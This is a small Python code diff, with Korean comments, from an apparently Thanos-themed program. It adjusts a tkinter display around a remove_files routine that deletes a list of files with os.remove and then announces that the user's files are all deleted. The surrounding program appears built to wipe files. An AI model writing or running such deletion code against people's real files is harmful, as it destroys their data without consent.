@@ -150,7 +150,7 @@ def clock(gui, c, antdd_filelist):
 
 # 모두 삭제되었을 때 GUI #혜연 11/22 추가
 def allRemovePrint(gui):
-    gui.l_thanos.destroy()
+    gui.l_thanos.pack_forget()
     l_allremove = tkinter.Label(gui.window, text="\n\nYour files are all deleted.\n\n",
                                 fg="red", bg="black", font='Helvetica 16 bold')
     l_allremove.pack()
@@ -159,6 +159,12 @@ def allRemovePrint(gui):
 
 
 def remove_files(gui, remove_filelist, ext=None):
+
+    # remove_filelist 가 비어있는 경우
+    if len(remove_filelist)==0:
+        print("더 이상 삭제할 파일이 없습니다")
+        allRemovePrint(gui)
+
     gui.l_thanos.destroy()
     gui.l_thanos = thanos.AnimatedGIF(gui.window, "../ui/thanos1.gif")
     gui.l_thanos.pack()
@@ -183,15 +189,11 @@ def remove_files(gui, remove_filelist, ext=None):
         os.remove(remove_filelist[0])
         print("더 이상 삭제할 파일이 없습니다")
         allRemovePrint(gui)
-    # 맨 처음 파일이 0개일 경우
-    else:
-        print("더 이상 삭제할 파일이 없습니다")
-        allRemovePrint(gui)
 
     # gui
     sleep(2)
 
-    gui.l_thanos.destroy()
+    gui.l_thanos.pack_forget()
     gui.l_thanos = tkinter.Label(gui.window, image=gui.thanos)
     gui.l_thanos.pack()
 
